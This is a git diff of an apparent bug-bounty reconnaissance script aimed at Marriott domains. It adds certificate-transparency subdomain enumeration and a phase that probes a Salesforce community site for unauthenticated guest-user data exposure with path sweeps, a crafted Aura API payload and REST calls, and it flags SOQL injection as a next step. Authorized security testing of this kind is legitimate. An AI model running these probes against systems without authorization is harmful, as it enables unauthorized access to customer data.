@@ -6,8 +6,9 @@
 # Scope check: SCOPE_FILE=~/bug-bounty-hunting-/config/marriott-scope.yaml ~/bug-bounty-hunting-/scripts/scope-check.sh <host>
 
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/gorib/go/bin:/home/gorib/.pdtm/go/bin:/home/gorib/.local/bin
-cd /home/gorib/hunt
-BB=~/bug-bounty-hunting-
+BB="${BB:-$HOME/bug-bounty-hunting-}"
+mkdir -p "$HOME/hunt"
+cd "$HOME/hunt"
 RESULTS="$BB/results/marriott"
 OUTDIR="$RESULTS/session2"
 mkdir -p "$OUTDIR"
@@ -35,8 +36,8 @@ echo "=== Marriott Session 2 — $(date) ==="
 section "PHASE 1 — CT Log Wildcard Enum"
 
 ct_enum() {
-  local pattern="$1" outfile="$2"
-  echo "  Querying crt.sh: $pattern"
+  local label="$1" pattern="$2" outfile="$3"
+  echo -n "  crt.sh [$label]: "
   curl -sk --max-time 45 "https://crt.sh/?q=${pattern}&output=json" \
     | python3 -c "
 import sys,json
@@ -48,20 +49,23 @@ try:
             if n and '.' in n and n not in seen:
                 seen.add(n); print(n.lower())
 except Exception as ex:
-    print(f'# crt.sh error: {ex}', file=sys.stderr)
+    import sys; print(f'# error: {ex}', file=sys.stderr)
 " 2>/dev/null | sort -u >> "$outfile"
-  echo "    → $(wc -l < "$outfile" 2>/dev/null || echo 0) unique subdomains"
+  echo "$(wc -l < "$outfile" 2>/dev/null || echo 0) subs"
 }
 
-ct_enum "%25apigwc.marriott.com"        "$OUTDIR/ct-apigwc.txt"
-ct_enum "%25apigatewayc.marriott.com"   "$OUTDIR/ct-apigatewayc.txt"
-ct_enum "%25dcfgateway.marriott.com"    "$OUTDIR/ct-dcfgateway.txt"
-ct_enum "%25gateway.marriott.com"       "$OUTDIR/ct-gateway.txt"
-ct_enum "%25gateway-apc.marriott.com"   "$OUTDIR/ct-gateway-apc.txt"
-ct_enum "%25uat.marriott.com"           "$OUTDIR/ct-uat.txt"
-ct_enum "%25artifactory.marriott.com"   "$OUTDIR/ct-artifactory.txt"
-ct_enum "%25sba.marriott.com"           "$OUTDIR/ct-sba.txt"
-ct_enum "%25mgs.marriott.com"           "$OUTDIR/ct-mgs.txt"
+# Correct crt.sh patterns (% = wildcard in crt.sh; %25 = URL-encoded %):
+#   *.sub.marriott.com   → %25.sub.marriott.com  (third-level subdomains)
+#   gateway*.marriott.com → %25gateway%25.marriott.com  (prefix match at 2nd level)
+ct_enum "*.apigwc.marriott.com"       "%25.apigwc.marriott.com"        "$OUTDIR/ct-apigwc.txt"
+ct_enum "*.apigatewayc.marriott.com"  "%25.apigatewayc.marriott.com"   "$OUTDIR/ct-apigatewayc.txt"
+ct_enum "*.dcfgateway.marriott.com"   "%25.dcfgateway.marriott.com"    "$OUTDIR/ct-dcfgateway.txt"
+ct_enum "gateway*.marriott.com"       "%25gateway%25.marriott.com"     "$OUTDIR/ct-gateway.txt"
+ct_enum "*gateway-apc.marriott.com"   "%25gateway-apc.marriott.com"    "$OUTDIR/ct-gateway-apc.txt"
+ct_enum "*uat.marriott.com"           "%25uat.marriott.com"             "$OUTDIR/ct-uat.txt"
+ct_enum "*.artifactory.marriott.com"  "%25.artifactory.marriott.com"   "$OUTDIR/ct-artifactory.txt"
+ct_enum "*.sba.marriott.com"          "%25.sba.marriott.com"           "$OUTDIR/ct-sba.txt"
+ct_enum "*.mgs.marriott.com"          "%25.mgs.marriott.com"           "$OUTDIR/ct-mgs.txt"
 
 echo ""
 echo "=== UAT environments discovered ==="
@@ -386,6 +390,77 @@ curl -sk --max-time 10 \
   "https://owa.marriott.com/autodiscover/autodiscover.xml" \
   | python3 -m json.tool 2>/dev/null \
   || curl -sk --max-time 10 "https://owa.marriott.com/autodiscover/autodiscover.xml" | head -20
+
+# ============================================================
+# PHASE 7b — Salesforce Community Cloud (cpp.marriott.com)
+# cpp.marriott.com redirects to cpp.marriott.com/s/ = Salesforce Experience Cloud
+# Bug class: Salesforce Guest User Object Exposure (unauthenticated sObject API access)
+# ============================================================
+
+section "PHASE 7b — Salesforce (cpp.marriott.com)"
+
+CPP="cpp.marriott.com"
+echo "=== $CPP — Salesforce Community Cloud ==="
+hdr "$CPP"
+echo ""
+
+# Test Salesforce API endpoints accessible without auth (Guest User)
+# These are common Salesforce misconfiguration vectors
+for SFPATH in \
+  /s/ \
+  /s/sfsites/aura \
+  /aura \
+  /auraFW/javascript/randomid/aura_prod.js \
+  /services/data/ \
+  /services/data/v55.0/ \
+  /services/data/v55.0/sobjects/ \
+  /services/data/v55.0/query/?q=SELECT+Id,Name+FROM+Account+LIMIT+5 \
+  /services/apexrest/ \
+  /services/oauth2/authorize \
+  /services/oauth2/token \
+  /guest/user \
+  /lightning/r/Account/ \
+  /s/login \
+  /s/profile \
+  /s/article/ \
+  /robots.txt; do
+  echo -n "  $SFPATH: "
+  curl -sk --max-time 10 -o /dev/null \
+    -w "HTTP %{http_code} | %{size_download}B\n" \
+    "https://$CPP$SFPATH"
+done
+
+# Salesforce Aura API — test for Guest User data exposure
+echo ""
+echo "  Salesforce Aura descriptor test:"
+AURA_RESP=$(curl -sk --max-time 15 \
+  -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "message=%7B%22actions%22%3A%5B%7B%22id%22%3A%221%3Ba%22%2C%22descriptor%22%3A%22serviceComponent%3A%2F%2Fui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController%2FACTION%24getItems%22%2C%22callingDescriptor%22%3A%22UNKNOWN%22%2C%22params%22%3A%7B%7D%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22unknown%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%7D&aura.pageURI=%2Fs%2F&aura.token=undefined" \
+  "https://$CPP/s/sfsites/aura" 2>/dev/null)
+echo "  Response size: ${#AURA_RESP} bytes"
+echo "$AURA_RESP" | python3 -m json.tool 2>/dev/null | head -20 || echo "  (not JSON or empty)"
+
+# Check if guest user can access standard objects via REST API
+echo ""
+echo "  Salesforce REST API guest test:"
+curl -sk --max-time 15 \
+  -H "Authorization: Bearer guest" \
+  "https://$CPP/services/data/v55.0/sobjects/" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -30 \
+  || echo "  (auth required or no REST API access)"
+
+# If /services/data/ returns anything → CRITICAL: data model exposed
+DATA_RESP=$(curl -sk --max-time 10 "https://$CPP/services/data/" 2>/dev/null)
+if echo "$DATA_RESP" | python3 -m json.tool >/dev/null 2>&1; then
+  echo ""
+  echo "  *** SALESFORCE REST API ACCESSIBLE — enumerate versions ***"
+  echo "$DATA_RESP" | python3 -m json.tool
+fi
+
+echo ""
+echo "  Decision: If Aura returns data objects → test SOQL injection via listView"
+echo "  Decision: If /services/data/v55.0/sobjects/ returns sObject list → Guest User exposed"
+echo "  Report class: Salesforce Guest User misconfiguration → unauthorized data access"
 
 # ============================================================
 # PHASE 8 — Live CT-discovered subdomains (from Phase 1)
